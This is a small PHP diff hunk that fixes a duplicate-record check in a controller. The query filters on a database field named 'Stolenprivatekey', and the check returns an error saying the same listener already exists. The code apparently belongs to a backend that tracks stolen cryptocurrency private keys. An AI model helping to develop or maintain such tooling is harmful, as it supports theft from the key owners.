@@ -209,7 +209,7 @@ class CreateController extends Controller
             }
 
             $Permissions =  Db::table('oneth')->field('*')->where(['tgid' => $hash['id'], 'Stolenprivatekey' => $data['Stolenprivatekey']])->find();
-            if (!$Permissions) {
+            if ($Permissions) {
                 echo json_encode(retur('失败', '相同监听已存在,请勿重复添加', 403));
                 exit;
             }
